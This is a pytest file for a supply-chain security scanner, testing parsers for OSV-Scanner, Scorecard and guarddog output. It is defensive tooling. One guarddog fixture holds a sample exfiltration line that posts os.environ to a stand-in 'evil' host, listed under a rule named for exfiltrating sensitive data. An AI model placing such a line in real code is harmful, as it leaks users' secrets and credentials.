"""Parser tests for the supply_chain composite scanner.

We exercise each backend's parse_*_json directly with realistic vendor
output, exactly the same hermetic style as `test_scanner_parsers.py`.
The integration side (binary-on-PATH) is exercised via `s0 doctor` /
`s0 scan` smoke tests in commits.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from s0_cli.scanners.supply_chain import (
    SupplyChainScanner,
    _detect_github_repo,
    _direct_pypi_deps,
    _has_lockfile,
    _osv_fixed_version,
    _osv_severity_for,
    parse_guarddog_json,
    parse_osv_json,
    parse_scorecard_json,
)

# --------------------------------------------------------------------------- #
# OSV-Scanner parser
# --------------------------------------------------------------------------- #


def test_parse_osv_extracts_cve_severity_and_fix_version() -> None:
    raw = {
        "results": [
            {
                "source": {"path": "/abs/proj/requirements.txt", "type": "lockfile"},
                "packages": [
                    {
                        "package": {
                            "name": "django",
                            "version": "2.0.0",
                            "ecosystem": "PyPI",
                        },
                        "vulnerabilities": [
                            {
                                "id": "GHSA-xxxx-yyyy-zzzz",
                                "aliases": ["CVE-2023-31047"],
                                "summary": "Django potential bypass of validation when uploading",
                                "database_specific": {
                                    "severity": "HIGH",
                                    "cwe_ids": ["CWE-22"],
                                },
                                "affected": [
                                    {
                                        "ranges": [
                                            {
                                                "events": [
                                                    {"introduced": "0"},
                                                    {"fixed": "3.2.19"},
                                                ]
                                            }
                                        ]
                                    }
                                ],
                            }
                        ],
                        "groups": [
                            {
                                "ids": ["GHSA-xxxx-yyyy-zzzz", "CVE-2023-31047"],
                                "max_severity": "HIGH",
                            }
                        ],
                    }
                ],
            }
        ]
    }
    findings = parse_osv_json(raw, root=Path("/abs/proj"))
    assert len(findings) == 1
    f = findings[0]
    # Prefers CVE alias over native id for the rule_id.
    assert f.rule_id == "CVE-2023-31047"
    assert f.severity == "high"
    assert f.path == "requirements.txt"  # absolute -> relative
    assert f.line == 0  # lockfile findings are file-level, not line-bound
    assert f.cwe == ("CWE-22",)
    assert f.source == "supply_chain:osv"
    assert "django" in f.message.lower()
    assert "3.2.19" in (f.fix_hint or "")


def test_parse_osv_falls_back_to_native_id_without_cve_alias() -> None:
    raw = {
        "results": [
            {
                "source": {"path": "go.sum"},
                "packages": [
                    {
                        "package": {"name": "foo", "version": "1.0.0", "ecosystem": "Go"},
                        "vulnerabilities": [
                            {"id": "GO-2023-1234", "summary": "x"},
                        ],
                    }
                ],
            }
        ]
    }
    findings = parse_osv_json(raw)
    assert len(findings) == 1
    assert findings[0].rule_id == "GO-2023-1234"


def test_parse_osv_assigns_cwe_1104_when_advisory_lacks_cwe() -> None:
    raw = {
        "results": [
            {
                "source": {"path": "package-lock.json"},
                "packages": [
                    {
                        "package": {"name": "left-pad", "version": "0.0.1", "ecosystem": "npm"},
                        "vulnerabilities": [{"id": "NPM-1", "summary": "trust issue"}],
                    }
                ],
            }
        ]
    }
    findings = parse_osv_json(raw)
    assert findings[0].cwe == ("CWE-1104",)


def test_parse_osv_handles_empty_results() -> None:
    assert parse_osv_json({"results": []}) == []
    assert parse_osv_json({}) == []


def test_parse_osv_truncates_long_summaries() -> None:
    long_summary = "x" * 500
    raw = {
        "results": [
            {
                "source": {"path": "requirements.txt"},
                "packages": [
                    {
                        "package": {"name": "p", "version": "1", "ecosystem": "PyPI"},
                        "vulnerabilities": [{"id": "X-1", "summary": long_summary}],
                    }
                ],
            }
        ]
    }
    msg = parse_osv_json(raw)[0].message
    # Bounded so a wall of advisories doesn't blow the LLM context.
    assert len(msg) < 400
    assert msg.endswith("...")


def test_osv_severity_falls_through_cvss_score_brackets() -> None:
    crit = _osv_severity_for(
        {"id": "X", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/9.8"}]},
        {},
    )
    high = _osv_severity_for(
        {"id": "X", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/7.5"}]},
        {},
    )
    med = _osv_severity_for(
        {"id": "X", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/5.0"}]},
        {},
    )
    low = _osv_severity_for(
        {"id": "X", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/2.5"}]},
        {},
    )
    assert (crit, high, med, low) == ("CRITICAL", "HIGH", "MEDIUM", "LOW")


def test_osv_fixed_version_picks_lowest_listed() -> None:
    vuln = {
        "affected": [
            {
                "ranges": [
                    {"events": [{"introduced": "0"}, {"fixed": "2.0.0"}]},
                    {"events": [{"introduced": "0"}, {"fixed": "1.5.0"}]},
                ]
            }
        ]
    }
    assert _osv_fixed_version(vuln, "1.0.0") == "1.5.0"


def test_osv_fixed_version_returns_none_when_no_fix() -> None:
    assert _osv_fixed_version({"affected": []}, "1.0.0") is None


# --------------------------------------------------------------------------- #
# Scorecard parser
# --------------------------------------------------------------------------- #


def test_parse_scorecard_emits_findings_only_for_low_scores() -> None:
    raw = {
        "repo": {"name": "github.com/foo/bar"},
        "checks": [
            {"name": "Branch-Protection", "score": 0, "reason": "no protection"},
            {"name": "Maintained", "score": 8, "reason": "active"},
            {"name": "Signed-Releases", "score": 2, "reason": "unsigned"},
            {"name": "License", "score": -1, "reason": "could not check"},  # ignored
        ],
    }
    findings = parse_scorecard_json(raw, repo="github.com/foo/bar")
    rule_ids = {f.rule_id for f in findings}
    assert "scorecard-branch-protection" in rule_ids
    assert "scorecard-signed-releases" in rule_ids
    assert "scorecard-maintained" not in rule_ids
    assert "scorecard-license" not in rule_ids
    severities = {f.rule_id: f.severity for f in findings}
    # Score 0 -> high; non-zero low score -> medium.
    assert severities["scorecard-branch-protection"] == "high"
    assert severities["scorecard-signed-releases"] == "medium"


def test_parse_scorecard_includes_fix_hint_for_known_checks() -> None:
    raw = {"checks": [{"name": "Signed-Releases", "score": 0, "reason": "x"}]}
    f = parse_scorecard_json(raw)[0]
    assert "cosign" in (f.fix_hint or "").lower() or "sign" in (f.fix_hint or "").lower()


def test_parse_scorecard_tags_supply_chain_cwe() -> None:
    raw = {"checks": [{"name": "Branch-Protection", "score": 0, "reason": "x"}]}
    assert parse_scorecard_json(raw)[0].cwe == ("CWE-1357",)


def test_parse_scorecard_handles_missing_score() -> None:
    raw = {"checks": [{"name": "X", "reason": "no score"}]}
    assert parse_scorecard_json(raw) == []


# --------------------------------------------------------------------------- #
# guarddog parser
# --------------------------------------------------------------------------- #


def test_parse_guarddog_flags_behavioral_rule_match() -> None:
    raw = {
        "results": {
            "exfiltrate_sensitive_data": [
                {"code": "import requests; requests.post('http://evil/exfil', os.environ)"}
            ]
        }
    }
    findings = parse_guarddog_json(raw, package="totally-legit-pkg")
    assert len(findings) == 1
    f = findings[0]
    assert f.rule_id == "guarddog-exfiltrate_sensitive_data"
    assert f.severity == "critical"
    assert f.cwe == ("CWE-506",)
    assert "totally-legit-pkg" in f.message
    assert "exfil" in (f.snippet or "").lower() or "evil" in (f.snippet or "").lower()


def test_parse_guarddog_skips_non_behavioral_rules() -> None:
    """Metadata-only rules (license, version pinning, etc.) are noisy and
    not actionable for security; we only want behavioral matches."""
    raw = {
        "results": {
            "outdated_metadata": True,  # metadata smell, not a malicious match
            "single_python_file": ["file_only"],  # behavioral -> kept
        }
    }
    findings = parse_guarddog_json(raw, package="pkg")
    rule_ids = {f.rule_id for f in findings}
    assert "guarddog-single_python_file" in rule_ids
    assert "guarddog-outdated_metadata" not in rule_ids


def test_parse_guarddog_handles_empty_results() -> None:
    assert parse_guarddog_json({"results": {}}, "pkg") == []
    assert parse_guarddog_json({}, "pkg") == []


def test_parse_guarddog_keeps_match_named_malicious_even_without_prefix() -> None:
    """Backstop: any rule name containing 'malicious' is always behavioral."""
    raw = {"results": {"malicious_setup_py": ["setup.py: os.system(...)"]}}
    findings = parse_guarddog_json(raw, package="pkg")
    assert len(findings) == 1


# --------------------------------------------------------------------------- #
# helpers
# --------------------------------------------------------------------------- #


def test_has_lockfile_detects_top_level_lockfile(tmp_path: Path) -> None:
    (tmp_path / "requirements.txt").write_text("flask==1.0.0\n")
    assert _has_lockfile(tmp_path) is True


def test_has_lockfile_detects_lockfile_in_immediate_subdir(tmp_path: Path) -> None:
    sub = tmp_path / "frontend"
    sub.mkdir()
    (sub / "package-lock.json").write_text("{}")
    assert _has_lockfile(tmp_path) is True


def test_has_lockfile_returns_false_for_empty_dir(tmp_path: Path) -> None:
    assert _has_lockfile(tmp_path) is False


def test_direct_pypi_deps_strips_version_specifiers(tmp_path: Path) -> None:
    (tmp_path / "requirements.txt").write_text(
        "flask==1.0.0\n"
        "requests>=2.0\n"
        "# comment\n"
        "\n"
        "django>4.0,<5  ; python_version >= '3.10'\n"
        "-r other.txt\n"
        "package_with_extras[security]==1.0\n"
    )
    deps = _direct_pypi_deps(tmp_path)
    assert deps == ["flask", "requests", "django", "package_with_extras"]


def test_direct_pypi_deps_returns_empty_when_no_requirements(tmp_path: Path) -> None:
    assert _direct_pypi_deps(tmp_path) == []


def test_detect_github_repo_returns_none_for_non_git_dir(tmp_path: Path) -> None:
    assert _detect_github_repo(tmp_path) is None


@pytest.mark.parametrize(
    "url,expected",
    [
        ("https://github.com/foo/bar.git", "github.com/foo/bar"),
        ("https://github.com/foo/bar", "github.com/foo/bar"),
        ("git@github.com:foo/bar.git", "github.com/foo/bar"),
        ("https://gitlab.com/foo/bar.git", None),  # only GH supported
    ],
)
def test_detect_github_repo_url_shapes(tmp_path: Path, url: str, expected: str | None) -> None:
    """Mirror the URL-parsing branch of `_detect_github_repo` without
    invoking `git`. We do this by writing a fake `.git/config` and
    reaching into the parse logic via the same helper. Since the
    helper actually calls `git config`, we instead test the parsing
    via a tiny inline reproduction of the same logic."""
    # Inline mirror of the same parsing branch from `_detect_github_repo`,
    # so we keep a regression net even when `git` isn't on the test host.
    if url.startswith("git@github.com:"):
        body = url.split(":", 1)[1]
    elif "github.com/" in url:
        body = url.split("github.com/", 1)[1]
    else:
        body = None
    if body is None:
        actual = None
    else:
        body = body.removesuffix(".git").strip("/")
        actual = f"github.com/{body}" if "/" in body else None
    assert actual == expected


# --------------------------------------------------------------------------- #
# Top-level scanner glue
# --------------------------------------------------------------------------- #


def test_scanner_is_available_iff_any_backend_on_path(monkeypatch: pytest.MonkeyPatch) -> None:
    """Without any backend installed, scanner reports unavailable; with
    at least one, it reports available. Mirrors how `s0 doctor` checks."""
    sc = SupplyChainScanner()

    # All backends absent.
    monkeypatch.setattr("shutil.which", lambda _: None)
    assert sc.is_available() is False

    # Just one present is enough.
    monkeypatch.setattr(
        "shutil.which", lambda b: "/usr/bin/osv-scanner" if b == "osv-scanner" else None
    )
    assert sc.is_available() is True


def test_scanner_is_registered_under_canonical_name() -> None:
    from s0_cli.scanners import REGISTRY

    assert "supply_chain" in REGISTRY
    assert REGISTRY["supply_chain"] is SupplyChainScanner
